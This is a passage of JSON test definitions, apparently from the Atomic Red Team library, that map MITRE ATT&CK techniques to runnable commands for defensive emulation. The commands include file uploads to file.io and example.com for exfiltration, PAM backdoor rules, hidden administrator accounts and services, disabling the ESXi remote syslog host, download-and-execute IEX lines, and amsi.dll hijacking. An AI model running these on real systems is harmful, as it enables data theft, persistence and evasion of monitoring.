			"command": "New-Item -Path \"#{output_path}\" -ItemType Directory > $null\n& \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\"\n",
			"cleanup_command": "Remove-Item -Recurse #{output_path} -ErrorAction Ignore\n"
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "Wmic Group Discovery",
		"auto_generated_guid": "7413be50-be8e-430f-ad4d-07bf197884b2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic group get name\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "WMIObject Group Discovery",
		"auto_generated_guid": "69119e58-96db-4110-ad27-954e48f3bb13",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-WMIObject Win32_Group\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "Permission Groups Discovery for Containers- Local Groups",
		"auto_generated_guid": "007d7aa4-8c4d-4f55-ba6a-7c965d51219c",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify docker service is running.",
				"prereq_command": "sudo systemctl status docker  --no-pager\n",
				"get_prereq_command": "sudo systemctl start docker\n"
			}
		],
		"executor": {
			"command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/\ndocker run --name t1069_container  -d -t t1069\ndocker exec t1069_container ./test.sh",
			"cleanup_command": "docker stop t1069_container\ndocker rmi -f t1069",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1069.001",
		"phases": ["discovery"]
	},
	{
		"name": "Exfiltrate data HTTPS using curl windows",
		"auto_generated_guid": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "Test file to upload",
				"type": "path",
				"default": "PathToAtomicsFolder/T1048.002/src/artifact"
			},
			"curl_path": {
				"description": "path to curl.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\Curl.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Curl must be installed on system.\n",
				"prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n"
			},
			{
				"description": "#{input_file} must be exist on system.\n",
				"prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact\" -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n"
		},
		"attack_technique": "T1048.002",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
		"auto_generated_guid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"input_file": {
				"description": "Test file to upload",
				"type": "path",
				"default": "PathToAtomicsFolder/T1048.002/src/artifact"
			}
		},
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n"
		},
		"attack_technique": "T1048.002",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltrate data in a file over HTTPS using wget",
		"auto_generated_guid": "7ccdfcfa-6707-46bc-b812-007ab6ff951c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"input_file": {
				"description": "Test data to upload",
				"type": "path",
				"default": "PathToAtomicsFolder/T1048.002/src/artifact"
			},
			"endpoint_domain": {
				"description": "Endpoint to send data to",
				"type": "string",
				"default": "https://example.com/"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
		},
		"attack_technique": "T1048.002",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltrate data as text over HTTPS using wget",
		"auto_generated_guid": "8bec51da-7a6d-4346-b941-51eca448c4b0",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"endpoint_domain": {
				"description": "Endpoint to send data to",
				"type": "string",
				"default": "https://example.com/"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
		},
		"attack_technique": "T1048.002",
		"phases": ["exfiltration"]
	},
	{
		"name": "Malicious PAM rule",
		"auto_generated_guid": "4b9dde80-ae22-44b1-a82a-644bf009eb9c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_pam_conf": {
				"description": "PAM config file to modify.",
				"type": "string",
				"default": "/etc/pam.d/su-l"
			},
			"pam_rule": {
				"description": "Rule to add to the PAM config.",
				"type": "string",
				"default": "auth sufficient pam_succeed_if.so uid >= 0"
			},
			"index": {
				"description": "Index where the rule is inserted.",
				"type": "integer",
				"default": 1
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
			"cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"
		},
		"attack_technique": "T1556.003",
		"phases": ["credential-access", "defense-evasion", "persistence"]
	},
	{
		"name": "Malicious PAM rule (freebsd)",
		"auto_generated_guid": "b17eacac-282d-4ca8-a240-46602cf863e3",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_pam_conf": {
				"description": "PAM config file to modify.",
				"type": "string",
				"default": "/etc/pam.d/su"
			},
			"pam_rule": {
				"description": "Rule to add to the PAM config.",
				"type": "string",
				"default": "auth sufficient pam_succeed_if.so uid >= 0"
			},
			"index": {
				"description": "Index where the rule is inserted.",
				"type": "integer",
				"default": 8
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
			"cleanup_command": "sudo sed -i \"\" \"/#{pam_rule}/d\" #{path_to_pam_conf}\n"
		},
		"attack_technique": "T1556.003",
		"phases": ["credential-access", "defense-evasion", "persistence"]
	},
	{
		"name": "Malicious PAM module",
		"auto_generated_guid": "65208808-3125-4a2e-8389-a0a00e9ab326",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_pam_conf": {
				"description": "PAM config file to modify.",
				"type": "string",
				"default": "/etc/pam.d/su-l"
			},
			"pam_rule": {
				"description": "Rule to add to the PAM config.",
				"type": "string",
				"default": "auth sufficient /tmp/pam_evil.so"
			},
			"index": {
				"description": "Index where the rule is inserted.",
				"type": "integer",
				"default": 1
			},
			"path_to_pam_module_source": {
				"description": "Path to PAM module source code.",
				"type": "path",
				"default": "PathToAtomicsFolder/T1556.003/src/pam_evil.c"
			},
			"path_to_pam_module": {
				"description": "Path to PAM module object",
				"type": "path",
				"default": "/tmp/pam_evil.so"
			}
		},
		"dependencies": [
			{
				"description": "The PAM development library must be installed to build the PAM module\n",
				"prereq_command": "if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi\n"
			},
			{
				"description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n",
				"prereq_command": "if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
			"cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"
		},
		"attack_technique": "T1556.003",
		"phases": ["credential-access", "defense-evasion", "persistence"]
	},
	{
		"name": "Compress Data for Exfiltration With Rar",
		"auto_generated_guid": "02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_path": {
				"description": "Path that should be compressed into our output file",
				"type": "path",
				"default": "%USERPROFILE%"
			},
			"file_extension": {
				"description": "Extension of files to compress",
				"type": "string",
				"default": ".txt"
			},
			"output_file": {
				"description": "Path where resulting compressed data should be placed",
				"type": "path",
				"default": "%USERPROFILE%\\T1560.001-data.rar"
			},
			"rar_installer": {
				"description": "Winrar installer",
				"type": "path",
				"default": "%TEMP%\\winrar.exe"
			},
			"rar_exe": {
				"description": "The RAR executable from Winrar",
				"type": "path",
				"default": "%programfiles%/WinRAR/Rar.exe"
			}
		},
		"dependencies": [
			{
				"description": "Rar tool must be installed at specified location (#{rar_exe})\n",
				"prereq_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n",
				"get_prereq_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n",
			"cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Compress Data and lock with password for Exfiltration with winrar",
		"auto_generated_guid": "8dd61a55-44c6-43cc-af0c-8bdda276860c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"rar_installer": {
				"description": "Winrar installer",
				"type": "path",
				"default": "%TEMP%\\winrar.exe"
			},
			"rar_exe": {
				"description": "The RAR executable from Winrar",
				"type": "path",
				"default": "%programfiles%/WinRAR/Rar.exe"
			}
		},
		"dependencies": [
			{
				"description": "Rar tool must be installed at specified location (#{rar_exe})\n",
				"prereq_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n",
				"get_prereq_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Compress Data and lock with password for Exfiltration with winzip",
		"auto_generated_guid": "01df0353-d531-408d-a0c5-3161bf822134",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"winzip_exe": {
				"description": "Path to installed Winzip executable",
				"type": "path",
				"default": "%ProgramFiles%\\WinZip\\winzip64.exe"
			},
			"winzip_url": {
				"description": "Path to download Windows Credential Editor zip file",
				"type": "url",
				"default": "https://download.winzip.com/gl/nkln/winzip24-home.exe"
			},
			"winzip_hash": {
				"description": "File hash of the Windows Credential Editor zip file",
				"type": "string",
				"default": "B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Winzip must be installed\n",
				"prereq_command": "cmd /c 'if not exist \"#{winzip_exe}\" (echo 1) else (echo 0)'\n",
				"get_prereq_command": "IEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif(Invoke-WebRequestVerifyHash \"#{winzip_url}\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\winzip.exe\" #{winzip_hash}){\n  Write-Host Follow the installation prompts to continue\n  cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\winzip.exe\"\n}\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Compress Data and lock with password for Exfiltration with 7zip",
		"auto_generated_guid": "d1334303-59cb-4a03-8313-b3e24d02c198",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"7zip_installer": {
				"description": "7zip installer",
				"type": "path",
				"default": "%TEMP%\\7zip.exe"
			},
			"7zip_exe": {
				"description": "Path to installed 7zip executable",
				"type": "path",
				"default": "%ProgramFiles%\\7-zip\\7z.exe"
			}
		},
		"dependencies": [
			{
				"description": "7zip tool must be installed at specified location (#{7zip_exe})\n",
				"prereq_command": "if not exist \"#{7zip_exe}\" (exit /b 1)\n",
				"get_prereq_command": "echo Downloading 7-zip installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.7-zip.org/a/7z2301-x64.exe\" #{7zip_installer}\n#{7zip_installer} /S\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir\n",
			"cleanup_command": "rmdir /s /Q $PathToAtomicsFolder\\T1560.001\\victim-files >nul 2>&1\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Data Compressed - nix - zip",
		"auto_generated_guid": "c51cec55-28dd-4ad2-9461-1eacbc82c3a0",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_files": {
				"description": "Path that should be compressed into our output file, may include wildcards",
				"type": "path",
				"default": "/var/log/{w,b}tmp"
			},
			"output_file": {
				"description": "Path that should be output as a zip archive",
				"type": "path",
				"default": "$HOME/data.zip"
			}
		},
		"dependencies": [
			{
				"description": "Files to zip must exist (#{input_files})\n",
				"prereq_command": "if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "(which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)\necho Please set input_files argument to include files that exist\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "zip #{output_file} #{input_files}\n",
			"cleanup_command": "rm -f #{output_file}\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Data Compressed - nix - gzip Single File",
		"auto_generated_guid": "cde3c2af-3485-49eb-9c1f-0ed60e9cc0af",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_file": {
				"description": "Path that should be compressed",
				"type": "path",
				"default": "$HOME/victim-gzip.txt"
			},
			"input_content": {
				"description": "contents of compressed files if file does not already exist. default contains test credit card and social security number",
				"type": "string",
				"default": "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n",
			"cleanup_command": "rm -f #{input_file}.gz\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Data Compressed - nix - tar Folder or File",
		"auto_generated_guid": "7af2b51e-ad1c-498c-aca8-d3290c19535a",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_file_folder": {
				"description": "Path that should be compressed",
				"type": "path",
				"default": "$HOME/$USERNAME"
			},
			"output_file": {
				"description": "File that should be output",
				"type": "path",
				"default": "$HOME/data.tar.gz"
			}
		},
		"dependencies": [
			{
				"description": "Folder to zip must exist (#{input_file_folder})\n",
				"prereq_command": "test -e #{input_file_folder}\n",
				"get_prereq_command": "mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "tar -cvzf #{output_file} #{input_file_folder}\n",
			"cleanup_command": "rm -f #{output_file}\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Data Encrypted with zip and gpg symmetric",
		"auto_generated_guid": "0286eb44-e7ce-41a0-b109-3da516e05a5f",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"test_folder": {
				"description": "Path used to store files.",
				"type": "path",
				"default": "/tmp/T1560"
			},
			"test_file": {
				"description": "Temp file used to store encrypted data.",
				"type": "path",
				"default": "T1560"
			},
			"encryption_password": {
				"description": "Password used to encrypt data.",
				"type": "string",
				"default": "InsertPasswordHere"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "gpg and zip are required to run the test.",
				"prereq_command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then exit 1; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y gnupg zip)||(which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n",
			"cleanup_command": "rm -Rf #{test_folder}\n"
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Encrypts collected data with AES-256 and Base64",
		"auto_generated_guid": "a743e3a6-e8b2-4a30-abe7-ca85d201b5d3",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_folder": {
				"description": "Path to the folder used to store the test files",
				"type": "path",
				"default": "/tmp/t1560"
			},
			"input_file": {
				"description": "Name of the compressed and encrypted files",
				"type": "string",
				"default": "t1560_data"
			},
			"enc_pass": {
				"description": "Password used to encrypt the data",
				"type": "string",
				"default": "atomic_enc_pass"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The folder and test files must exist",
				"prereq_command": "if [ ! -d #{input_folder} ]; then exit 1; else exit 0; fi;",
				"get_prereq_command": "if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder}; cd #{input_folder}; touch {a..z}.data; fi;"
			}
		],
		"executor": {
			"command": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64",
			"cleanup_command": "rm -rf #{input_folder}",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "ESXi - Remove Syslog remote IP",
		"auto_generated_guid": "36c62584-d360-41d6-886f-d194654be7c2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"plink_file": {
				"description": "Path to Putty",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"username": {
				"description": "Username used to log into ESXi",
				"type": "string",
				"default": "root"
			},
			"password": {
				"description": "password used to log into ESXI",
				"type": "string",
				"default": "n/a"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The plink executable must be found in the ExternalPayloads folder.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "# Extract line with IP address from the syslog configuration output\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" > c:\\temp\\loghost.txt\n\n# Replace the IP with \"0\"\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\n\n# Extract the IP from the line extracted from findstr\n$inputFilePath = \"c:\\temp\\loghost.txt\"\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\n\n$fileContent = Get-Content -Path $inputFilePath -Raw\n\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\n    Write-Host \"The content is $fileContent\"\n    Write-Host \"The file is empty\"\n} else {\n    # Use a regular expression to extract IP addresses\n    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\n    \n    $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\n\n    $output | Out-File -FilePath $outputFilePath -Encoding ascii\n    \n    Write-Host \"IP addresses extracted and saved to $outputFilePath\"\n}\n",
			"cleanup_command": "# Re-add the initially extracted IP\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\\temp\\loghost_ip.txt\n\nrm c:\\temp\\loghost_ip.txt\nrm c:\\temp\\loghost.txt\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1560.001",
		"phases": ["collection"]
	},
	{
		"name": "Persistance with Event Monitor - emond",
		"auto_generated_guid": "23c9c127-322b-4c75-95ca-eff464906114",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"plist": {
				"description": "Path to attacker emond plist file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist"
			}
		},
		"executor": {
			"command": "sudo cp \"#{plist}\" /etc/emond.d/rules/T1546.014_emond.plist\nsudo touch /private/var/db/emondClients/T1546.014\n",
			"cleanup_command": "sudo rm /etc/emond.d/rules/T1546.014_emond.plist\nsudo rm /private/var/db/emondClients/T1546.014\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1546.014",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Extract binary files via VBA",
		"auto_generated_guid": "6afe288a-8a8b-4d33-a629-8d03ba9dad3a",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n",
			"cleanup_command": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1564",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create a Hidden User Called \"$\"",
		"auto_generated_guid": "2ec63cc2-4975-41a6-bf09-dffdfb610778",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "net user $ ATOMIC123! /add /active:yes",
			"cleanup_command": "net user $ /DELETE 2>&1"
		},
		"attack_technique": "T1564",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create an \"Administrator \" user (with a space on the end)",
		"auto_generated_guid": "5bb20389-39a5-4e99-9264-aeb92a55a85c",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "New-LocalUser -Name \"Administrator \" -NoPassword",
			"cleanup_command": "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null"
		},
		"attack_technique": "T1564",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create and Hide a Service with sc.exe",
		"auto_generated_guid": "333c7de0-6fbe-42aa-ac2b-c7e40b18246a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "Name of service to create",
				"type": "string",
				"default": "AtomicService"
			},
			"executable_command": {
				"description": "Command to execute as a service",
				"type": "string",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc sdset #{service_name} \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n",
			"cleanup_command": "sc sdset #{service_name} \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\nsc.exe delete #{service_name}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1564",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Command Execution with NirCmd",
		"auto_generated_guid": "2748ab4a-1e0b-4cf2-a2b0-8ef765bec7be",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"nircmd_location": {
				"description": "Location of nircmd executable",
				"type": "Path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.exe"
			},
			"command_to_execute": {
				"description": "Command for nircmd to execute",
				"type": "Path",
				"default": "win child class \"Shell_TrayWnd\" hide class \"TrayClockWClass\""
			},
			"cleanup_command_to_execute": {
				"description": "Cleanup command to undo the arbitrary command ran by nircmd",
				"type": "Path",
				"default": "win child class \"Shell_TrayWnd\" show class \"TrayClockWClass\""
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The Nircmd executable must exist at (#{nircmd_location})\n",
				"prereq_command": "if (Test-Path \"#{nircmd_location}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://www.nirsoft.net/utils/nircmd-x64.zip\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.zip\" \nexpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"\n"
			}
		],
		"executor": {
			"command": "cmd /c \"#{nircmd_location}\" #{command_to_execute}\n",
			"cleanup_command": "cmd /c \"#{nircmd_location}\" #{cleanup_command_to_execute} -erroraction silentlycontinue | out-null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1564",
		"phases": ["defense-evasion"]
	},
	{
		"name": "DLL Search Order Hijacking - amsi.dll",
		"auto_generated_guid": "8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n",
			"cleanup_command": "del %APPDATA%\\updater.exe >nul 2>&1\ndel %APPDATA%\\amsi.dll >nul 2>&1\n",
			"name": "command_prompt",
